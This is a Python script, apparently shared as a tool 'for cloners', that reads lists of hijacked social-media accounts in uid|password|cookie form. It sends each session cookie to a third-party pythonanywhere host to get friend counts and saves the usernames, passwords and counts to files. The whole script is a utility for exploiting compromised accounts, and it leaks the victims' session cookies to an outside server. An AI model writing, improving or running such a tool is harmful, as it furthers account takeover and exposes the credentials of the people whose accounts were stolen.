"""
echo "Written by Ahmed Ali"

"""
import os
import sys
import requests

class FriendChecker:
    GREEN = "\033[38;5;46m"
    RED = "\033[1;31m"
    YELLOW = "\033[1;33m"

    def __init__(self):
        os.system("clear")
        self.divider()
        print(f"{self.GREEN}This tool is created by Ahmed Ali")
        print(f"{self.YELLOW}This tool is made for cloners to check cloned ids total friends.\nIn file idz must be in uid|pass|cookie format. Otherwise, it will not work.")
        print(f"{self.GREEN}IDZ will be saved as uid|total_friends in uid_friends.txt\nIDZ will be saved as uid|pass|cookie|total_friends in uid_friends_data.txt")
        self.divider()
        self.get_file = input("Enter file path: ")
        self.divider()

    def divider(self):
        print("\033[1;37m-" * 54)

    def check_friend(self, cookie):
        response = requests.get(f'https://livedeadsegs.pythonanywhere.com/friends?cookie={cookie}')
        if response.status_code == 200:
            return response.text
        else:
            sys.exit("NETWORK PROBLEM")

    def process_file(self):
        try:
            get_file_info = open(self.get_file, 'r').read().splitlines()
        except FileNotFoundError:
            exit("File not found")

        for element in get_file_info:
            if element == '':
                break

            try:
                uid, password, cookie = element.split("|")
                store_friends_value = self.check_friend(cookie=cookie)
                if "cookies lol or cp" not in store_friends_value:
                    print(f"{self.GREEN}{uid}|{password}|{store_friends_value}")
                    open("uid_friends.txt", 'a').write(uid + "|" + store_friends_value + '\n')
                    open("uid_friends_data.txt", 'a').write(uid + "|" + store_friends_value + '\n')
                else:
                    print(f"{self.RED}{uid}|{password}|{store_friends_value}")
            except ValueError:
                print(f"{self.YELLOW}[WRONG FORMAT] " + element)
                open("wrong_format.txt", 'a').write(element + '\n')
                continue

        print(f"\033[1;32m\nThanks for using my tool.\nGive a star to my repo")

if __name__ == "__main__":
    friend_checker = FriendChecker()
    friend_checker.process_file()
